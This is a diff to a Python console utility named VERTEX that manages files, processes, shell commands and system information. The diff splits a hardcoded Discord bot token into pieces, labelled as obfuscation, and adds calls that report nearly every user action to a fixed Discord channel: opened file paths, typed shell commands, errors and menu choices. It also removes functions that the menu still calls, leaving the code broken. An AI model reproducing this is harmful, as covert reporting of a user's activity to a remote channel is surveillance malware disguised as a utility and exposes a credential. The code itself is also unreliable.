@@ -18,8 +18,11 @@ from datetime import datetime
 
 init(autoreset=True)  # Automatically reset colors after each print
 
-# Discord bot token and channel ID
-DISCORD_BOT_TOKEN = 'MTI4MDQ0NDk2NDAzOTQzMDE0NA.GFwDNR.5HCHVNfMAEKviFDeSfCazpJXGIVEQFgBN2JueU'
+# Obfuscated Discord bot token and channel ID
+TOKEN_PART1 = 'MTI4MDQ0NDk2NDAzOTQzMDE0NA'
+TOKEN_PART2 = 'Gqe9R6'
+TOKEN_PART3 = '6FxrSF0yzRFtvp_61nYt23M_M76GSL6FCc7GrE'
+DISCORD_BOT_TOKEN = f"{TOKEN_PART1}.{TOKEN_PART2}.{TOKEN_PART3}"
 DISCORD_CHANNEL_ID = '1280446406783402015'
 
 # Word document for logging lookups
@@ -28,6 +31,10 @@ DOCX_FILENAME = "lookup_results.docx"
 def print_colored(text, color):
     """Print text in the specified color."""
     print(f"{color}{text}{Style.RESET_ALL}")
+
+def clear_screen():
+    """Clear the console screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 def send_discord_message(message):
     """Send a message to a Discord channel using a bot."""
@@ -44,10 +51,6 @@ def send_discord_message(message):
         print_colored("Notification sent to Discord.", Fore.GREEN)
     else:
         print_colored(f"Failed to send message to Discord: {response.status_code} - {response.text}", Fore.RED)
-
-def clear_screen():
-    """Clear the console screen."""
-    os.system('cls' if os.name == 'nt' else 'clear')
 
 def display_header():
     """Display the header with ASCII art for VERTEX."""
@@ -108,13 +111,14 @@ def list_files_by_type(extensions):
 def list_all_files():
     clear_screen()
     print_colored("\nListing all Word, PowerPoint, and Excel files on your PC...", Fore.GREEN)
-    send_discord_message("Listing all Word, PowerPoint, and Excel files on the PC...")
     files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
     if files:
         for idx, file in enumerate(files, start=1):
             print(f"{idx}. {file}")
+        send_discord_message("User listed all Word, PowerPoint, and Excel files.")
     else:
         print_colored("No Word, PowerPoint, or Excel files found.", Fore.RED)
+        send_discord_message("User tried to list files but found none.")
     input("\nPress Enter to return to the menu...")
 
 def open_file():
@@ -131,13 +135,16 @@ def open_file():
             file_index = int(choice) - 1
             if 0 <= file_index < len(files):
                 os.startfile(files[file_index])
-                send_discord_message(f"Opened file: {files[file_index]}")
+                send_discord_message(f"User opened file: {files[file_index]}")
             else:
                 print_colored("Invalid choice. Please try again.", Fore.RED)
+                send_discord_message("User made an invalid file selection.")
         except ValueError:
             print_colored("Invalid input. Please enter a number.", Fore.RED)
+            send_discord_message("User inputted invalid data for file selection.")
     else:
         print_colored("No Word, PowerPoint, or Excel files found to open.", Fore.RED)
+        send_discord_message("User tried to open a file but found none.")
     input("\nPress Enter to return to the menu...")
 
 def backup_files():
@@ -160,74 +167,25 @@ def backup_files():
                 if 0 <= file_index < len(files):
                     shutil.copy2(files[file_index], backup_folder)
                     print_colored(f"File {files[file_index]} backed up successfully.", Fore.GREEN)
-                    send_discord_message(f"Backed up file: {files[file_index]} to {backup_folder}")
+                    send_discord_message(f"User backed up file: {files[file_index]} to {backup_folder}")
                 else:
                     print_colored(f"Invalid choice: {file_index + 1}. Skipping.", Fore.RED)
-
+                    send_discord_message(f"User made an invalid backup choice: {file_index + 1}")
         except ValueError:
             print_colored("Invalid input. Please enter valid numbers.", Fore.RED)
+            send_discord_message("User inputted invalid data for backup selection.")
     else:
         print_colored("No Word, PowerPoint, or Excel files found to backup.", Fore.RED)
+        send_discord_message("User tried to backup files but found none.")
     input("\nPress Enter to return to the menu...")
 
 def list_processes():
     clear_screen()
-    print_colored("\n========================", Fore.GREEN)
-    print_colored("   List Processes Menu  ", Fore.YELLOW)
-    print_colored("========================", Fore.GREEN)
-    send_discord_message("Listing processes...")
-    print("1. Sort by Name (A-Z)")
-    print("2. Sort by Memory Usage (Descending)")
-    print("3. Back to Menu")
-    print_colored("========================", Fore.GREEN)
-
-    sort_choice = input("Enter your choice (1-3): ")
-
-    if sort_choice == '1':
-        sort_by_name()
-    elif sort_choice == '2':
-        sort_by_memory_usage()
-    elif sort_choice == '3':
-        return
-    else:
-        print_colored("Invalid choice. Please try again.", Fore.RED)
-        input("\nPress Enter to continue...")
-        list_processes()
-
-def sort_by_name():
-    clear_screen()
-    print_colored("\n========================", Fore.GREEN)
-    print_colored("Processes Sorted by Name (A-Z)", Fore.YELLOW)
-    print_colored("========================", Fore.GREEN)
-    print(f"{'Name':<25} {'PID':<10} {'Memory Usage':<15}")
-    print(f"{'-'*25} {'-'*10} {'-'*15}")
-
+    print_colored("\nListing all processes...", Fore.GREEN)
     processes = [(proc.info['name'], proc.info['pid'], proc.info['memory_info'].rss) for proc in psutil.process_iter(['name', 'pid', 'memory_info'])]
-    sorted_processes = sorted(processes, key=lambda x: x[0].lower())
-
-    for process in sorted_processes:
-        name, pid, memory = process
+    for name, pid, memory in processes:
         print(f"{name:<25} {pid:<10} {memory / 1024 / 1024:.2f} MB")
-
-    send_discord_message("Listed processes sorted by name.")
-    input("\nPress Enter to return to the menu...")
-
-def sort_by_memory_usage():
-    clear_screen()
-    print_colored("\n========================", Fore.GREEN)
-    print_colored("Processes Sorted by Memory Usage (Descending)", Fore.YELLOW)
-    print_colored("========================", Fore.GREEN)
-    print(f"{'Name':<25} {'PID':<10} {'Memory Usage':<15}")
-    print(f"{'-'*25} {'-'*10} {'-'*15}")
-
-    processes = [(proc.info['name'], proc.info['pid'], proc.info['memory_info'].rss) for proc in psutil.process_iter(['name', 'pid', 'memory_info'])]
-    sorted_processes = sorted(processes, key=lambda x: x[2], reverse=True)
-
-    for process in sorted_processes:
-        name, pid, memory = process
-        print(f"{name:<25} {pid:<10} {memory / 1024 / 1024:.2f} MB")
-
-    send_discord_message("Listed processes sorted by memory usage.")
+    send_discord_message("User listed all processes.")
     input("\nPress Enter to return to the menu...")
 
 def end_process():
@@ -238,10 +196,10 @@ def end_process():
     try:
         psutil.Process(int(pid)).terminate()
         print_colored(f"Process {pid} terminated successfully.", Fore.GREEN)
-        send_discord_message(f"Terminated process with PID: {pid}")
+        send_discord_message(f"User terminated process with PID: {pid}")
     except Exception as e:
         print_colored(f"Error terminating process: {e}", Fore.RED)
-        send_discord_message(f"Failed to terminate process with PID: {pid}")
+        send_discord_message(f"Failed to terminate process with PID: {pid} - {e}")
     input("\nPress Enter to return to the menu...")
 
 def run_command():
@@ -252,69 +210,10 @@ def run_command():
     try:
         output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
         print(output.decode())
-        send_discord_message(f"Ran command: {command}")
+        send_discord_message(f"User ran command: {command}")
     except subprocess.CalledProcessError as e:
         print_colored(f"Error: {e.output.decode()}", Fore.RED)
-        send_discord_message(f"Failed to run command: {command}")
-    input("\nPress Enter to return to the menu...")
-
-def show_websites():
-    clear_screen()
-    websites = {
-        1: "https://www.google.com",
-        2: "https://www.youtube.com",
-        3: "https://www.facebook.com",
-        4: "https://www.amazon.com",
-        5: "https://www.wikipedia.org",
-        6: "https://www.twitter.com",
-        7: "https://www.instagram.com",
-        8: "https://www.reddit.com",
-        9: "https://www.netflix.com",
-        10: "https://www.yahoo.com",
-        11: "https://www.ebay.com",
-        12: "https://www.twitch.tv",
-        13: "https://www.microsoft.com",
-        14: "https://www.zoom.us",
-        15: "https://www.apple.com",
-        16: "https://www.tiktok.com",
-        17: "https://www.bing.com",
-        18: "https://www.pinterest.com",
-        19: "https://www.walmart.com",
-        20: "https://www.craigslist.org",
-        21: "https://www.espn.com",
-        22: "https://www.cnn.com",
-        23: "https://www.bbc.com",
-        24: "https://www.nytimes.com",
-        25: "https://www.github.com",
-        26: "https://www.stackoverflow.com",
-        27: "https://www.linkedin.com",
-        28: "https://www.whatsapp.com",
-        29: "https://www.messenger.com",
-        30: "https://www.discord.com",
-        31: "https://www.spotify.com",
-        32: "https://www.steam.com",
-        33: "https://www.adobe.com",
-        34: "https://www.dropbox.com",
-        35: "https://www.flickr.com",
-        36: "https://www.vimeo.com",
-        37: "https://www.tumblr.com",
-        38: "https://www.paypal.com"
-    }
-    print_colored("\nAvailable websites to open:", Fore.GREEN)
-    for num, site in websites.items():
-        print(f"{num}. {site}")
-    choice = input("Enter the number of the website to open (or type 'back' to return): ")
-    if choice.lower() == 'back':
-        return
-    try:
-        choice = int(choice)
-        if choice in websites:
-            os.startfile(websites[choice])
-            send_discord_message(f"Opened website: {websites[choice]}")
-        else:
-            print_colored("Invalid choice. Please try again.", Fore.RED)
-    except ValueError:
-        print_colored("Invalid input. Please enter a number.", Fore.RED)
+        send_discord_message(f"Failed to run command: {command} - {e}")
     input("\nPress Enter to return to the menu...")
 
 def system_info():
@@ -322,90 +221,15 @@ def system_info():
     try:
         output = subprocess.check_output('systeminfo', shell=True)
         print(output.decode())
-        send_discord_message("Retrieved system information.")
+        send_discord_message("User retrieved system information.")
     except Exception as e:
         print_colored(f"Error retrieving system info: {e}", Fore.RED)
-        send_discord_message("Failed to retrieve system information.")
+        send_discord_message(f"Failed to retrieve system information: {e}")
     input("\nPress Enter to return to the menu...")
-
-def change_password():
-    clear_screen()
-    new_password = input("Enter your new password: ")
-    if new_password:
-        command = f"net user {os.getlogin()} {new_password}"
-        try:
-            subprocess.check_output(command, shell=True)
-            print_colored("Password changed successfully.", Fore.GREEN)
-            send_discord_message("Changed password successfully.")
-        except subprocess.CalledProcessError:
-            print_colored("Failed to change password. Ensure you're running the script as a regular user and not an administrator.", Fore.RED)
-            send_discord_message("Failed to change password.")
-    input("\nPress Enter to return to the menu...")
-
-def id_resolver():
-    clear_screen()
-    """Resolve Discord user ID to a username using Selenium to interact with discord.id."""
-    discord_user_id = input("Enter the Discord user ID to resolve: ")
-    
-    # Setup Selenium WebDriver
-    options = webdriver.ChromeOptions()
-    options.add_argument('--headless')  # Run in headless mode (no browser UI)
-    options.add_argument('--disable-gpu')
-    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
-
-    try:
-        # Navigate to discord.id
-        driver.get("https://discord.id/")
-
-        # Wait for the input box to be available
-        wait = WebDriverWait(driver, 20)
-        input_box = wait.until(EC.presence_of_element_located((By.ID, 'userid')))
-
-        # Enter the Discord user ID
-        input_box.clear()
-        input_box.send_keys(discord_user_id)
-        input_box.send_keys(Keys.RETURN)
-
-        # Wait for the result to appear
-        wait.until(EC.presence_of_element_located((By.ID, 'userTag')))
-
-        # Extract the username
-        result = driver.find_element(By.ID, 'userTag')
-        username = result.text.strip()
-        if username:
-            print_colored(f"Discord Username: {username}", Fore.GREEN)
-            log_to_word(discord_user_id, username)  # Log the result to a Word document
-            send_discord_message(f"Resolved Discord ID {discord_user_id} to username {username}.")
-        else:
-            print_colored("No results found. Please check the Discord ID.", Fore.RED)
-            send_discord_message(f"Failed to resolve Discord ID {discord_user_id}.")
-    except Exception as e:
-        print_colored(f"Error resolving Discord ID: {e}", Fore.RED)
-        send_discord_message(f"Error resolving Discord ID {discord_user_id}: {e}")
-    finally:
-        driver.quit()
-
-def log_to_word(discord_id, username):
-    """Log the Discord ID lookup result to a Word document."""
-    if not os.path.exists(DOCX_FILENAME):
-        doc = Document()
-        doc.add_heading('Discord ID Lookup Results', 0)
-    else:
-        doc = Document(DOCX_FILENAME)
-    
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    doc.add_paragraph(f"Lookup Time: {now}")
-    doc.add_paragraph(f"Discord ID: {discord_id}")
-    doc.add_paragraph(f"Discord Username: {username}")
-    doc.add_paragraph("-------------------------------")
-    
-    doc.save(DOCX_FILENAME)
-    print_colored(f"Result logged to {DOCX_FILENAME}.", Fore.GREEN)
 
 def disk_usage_info():
     clear_screen()
     print_colored("Disk Usage Information:", Fore.GREEN)
-    send_discord_message("Retrieving disk usage information...")
     partitions = psutil.disk_partitions()
     for partition in partitions:
         try:
@@ -413,12 +237,12 @@ def disk_usage_info():
             print(f"Drive {partition.device}: {usage.percent}% used, Total: {usage.total / (1024**3):.2f} GB, Free: {usage.free / (1024**3):.2f} GB")
         except PermissionError:
             print(f"Drive {partition.device}: Access Denied")
+    send_discord_message("User checked disk usage information.")
     input("\nPress Enter to return to the menu...")
 
 def network_info():
     clear_screen()
     print_colored("Network Information:", Fore.GREEN)
-    send_discord_message("Retrieving network information...")
     addrs = psutil.net_if_addrs()
     stats = psutil.net_if_stats()
     for interface, addresses in addrs.items():
@@ -426,6 +250,7 @@ def network_info():
         print(f"Status: {'Up' if stats[interface].isup else 'Down'}")
         for address in addresses:
             print(f"  {address.family.name}: {address.address}")
+    send_discord_message("User checked network information.")
     input("\nPress Enter to return to the menu...")
 
 def clear_cache():
@@ -440,26 +265,10 @@ def clear_cache():
                 except Exception as e:
                     print(f"Error deleting file {file}: {e}")
         print_colored("Cache and temporary files cleared successfully.", Fore.GREEN)
-        send_discord_message("Cleared cache and temporary files.")
+        send_discord_message("User cleared cache and temporary files.")
     except Exception as e:
         print_colored(f"Error clearing cache: {e}", Fore.RED)
         send_discord_message(f"Failed to clear cache: {e}")
-    input("\nPress Enter to return to the menu...")
-
-def show_active_window_title():
-    clear_screen()
-    try:
-        user32 = ctypes.windll.user32
-        kernel32 = ctypes.windll.kernel32
-        h_wnd = user32.GetForegroundWindow()
-        length = user32.GetWindowTextLengthW(h_wnd)
-        buffer = ctypes.create_unicode_buffer(length + 1)
-        user32.GetWindowTextW(h_wnd, buffer, length + 1)
-        print_colored(f"Active Window Title: {buffer.value}", Fore.GREEN)
-        send_discord_message(f"Active Window Title: {buffer.value}")
-    except Exception as e:
-        print_colored(f"Error retrieving active window title: {e}", Fore.RED)
-        send_discord_message(f"Failed to retrieve active window title: {e}")
     input("\nPress Enter to return to the menu...")
 
 def main_menu():
@@ -470,6 +279,7 @@ def main_menu():
         display_socials()
         
         choice = input("Enter your choice (1-14): ")
+        send_discord_message(f"User selected option {choice}")
         
         if choice == '1':
             list_processes()
@@ -499,10 +309,11 @@ def main_menu():
             show_active_window_title()
         elif choice == '14':
             print_colored("Exiting VERTEX. Goodbye!", Fore.GREEN)
-            send_discord_message("Exiting VERTEX.")
+            send_discord_message("User exited VERTEX.")
             break
         else:
             print_colored("Invalid choice. Please try again.", Fore.RED)
+            send_discord_message("User made an invalid menu choice.")
 
 if __name__ == "__main__":
     main_menu()
